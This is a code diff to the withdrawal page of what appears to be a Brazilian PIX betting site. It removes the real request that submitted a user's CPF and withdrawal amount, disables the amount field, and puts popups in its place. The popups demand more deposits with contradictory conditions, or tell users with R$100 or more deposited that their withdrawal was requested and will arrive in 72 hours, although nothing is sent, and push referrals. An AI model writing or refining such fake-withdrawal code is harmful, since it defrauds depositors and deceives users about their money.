@@ -196,90 +196,39 @@ async function popup(titulo, texto, linkUrl, linkTexto){
         text: texto,
         confirmButtonText: `<a href=${linkUrl}>${linkTexto}</a>`,
         showCloseButton: true,
-        customClass: {
-          confirmButton: "primary-button button3 w-button",
-          popup: 'minting-container',
-        }
     });
-}
-
-function  toast(mensagem){
-  Swal.fire({
-              toast: true,
-              position: "top-end",
-              showConfirmButton: false,
-              timer: 4000,
-              icon: "error",
-              timerProgressBar: true,
-              text: mensagem,
-              color:"#000000",
-              iconColor: "#000000",
-              customClass: {
-                  popup: 'colored-toast',
-              },
-            })
 }
 
 
 async function processarForm(){
 
     event.preventDefault();
-    clearTimeout(timeoutId);
     var saldoString = "<?php echo $saldo; ?>"
     var depositouString = "<?php echo $depositou; ?>"
-    
     var saldo = parseFloat(saldoString)
     var depositou = parseFloat(depositouString)
     var elementoH4 = document.getElementById("alerta-saque");
-  
-
-    if(saldo <= 0){
-      toast("Sem saldo!");
-      
-    }
-    if(saldo >= 0 && depositou <= 49){
-      
-      const result = await popup('Que pena!', 'Ainda não alcançou o depósito minimo de R$50,00 para o saque, faça um depósito! É cumulativo', '../deposito', 'Depositar');
-
-      if(result.isConfirmed){
-        location.href = "../deposito";
-      }
-    }
-    if(saldo > 0 && saldo < 100){
-      elementoH4.textContent = "Saldo maior que 0 e menor que 100"
-    }
-
-    if(depositou >= 49 && saldo > 100 && saldo < 300){
-
-      const result = await popup('Falta pouco!', 'Você precisa alcançar um saldo de R$300,00', '../painel', 'Jogar');
-      if(result.isConfirmed){
-        location.href = "../painel";
-      }
-    }
-
-    if(depositou >= 49 && saldo >= 300){
-
-      
-       const result = await popup('UHUUL', 'Você conseguiu! Aguarde a fila de saque, e logo receberá o seu prêmio', '../painel', 'Ganhar mais!');
-       if(result.isConfirmed){
-        var CPF = document.getElementById("withdrawCPF").value;
-        var valor = document.getElementById("withdrawValue").value;
-        const response = await fetch(window.location.href, {
-        method: 'POST',
-        body: new URLSearchParams({
-        'withdrawCPF': CPF,
-        'withdrawValue': valor,
-      }),
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded',
-      'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content'),
-    },
-      })
-      location.href = "../painel";
-       } 
-    }
-
     
+    if(saldo <= 0){
+      elementoH4.textContent = "Saldo insuficiente, deposite para começar a lucrar";
+
+      return false;
+    }
+
+    if(depositou > 1 && depositou  < 48){
+      popup('ATIVE SEU SAQUE', 'Para liberar o recurso de saque, você precisa ter acumulado R$50 em depositos em sua conta! Faça o depósito para liberar a função automaticamente e ter saques ilimitados.', 'https://frutinhapix.com/deposito/', 'DEPOSITAR');
+      return false;
+    }
+
+    if(depositou >= 49 && depositou  <= 99){
+      popup('SAQUE PENDENTE', 'Você precisa ter feito um deposito de R$50 em sua conta! Lembrando que precisa ser 1 único no valor R$50. A função saque e liberada automaticamente apôs o deposito', 'https://frutinhapix.com/deposito/', 'ATIVAR AGORA');
+      return false;
+    }
+
+    if(depositou >= 100){
+      popup('SAQUE SOLICITADO', 'Estamos em alta demanda e o seu saque vai cair dentro de 72h. Indique um amigo e ganhe R$50 por convidado', 'https://frutinhapix.com/afiliate/', 'INDICAR');
+      return false;
+    }
 
     return false;
 }
@@ -318,7 +267,7 @@ Valor para saque: (SALDO: R$
 </h4>
 
 <div class="rarity-row roboto-type2">
-<input type="number" data-name="Valor de saque" min="0.00" max="" name="withdrawValue" id="withdrawValue" placeholder="R$<?= $saldo ?>" class="large-input-field w-node-_050dfc36-93a8-d840-d215-4fca9adfe60d-9adfe605 w-input" required>
+<input type="number" data-name="Valor de saque" min="0.00" max="" name="withdrawValue" id="withdrawValue" placeholder="R$<?= $saldo ?>" disabled="" class="large-input-field w-node-_050dfc36-93a8-d840-d215-4fca9adfe60d-9adfe605 w-input">
 
 
 </div>
